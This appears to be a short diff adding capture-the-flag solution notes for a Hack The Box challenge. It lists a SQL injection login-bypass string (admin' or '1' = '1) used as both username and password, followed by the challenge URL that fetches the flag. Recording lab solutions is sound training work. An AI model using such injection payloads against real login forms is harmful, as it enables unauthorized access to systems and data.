@@ -1,0 +1,4 @@
+username: admin' or '1' = '1
+password: admin' or '1' = '1
+
+http://docker.hackthebox.eu:50413/panel.php?info=flag
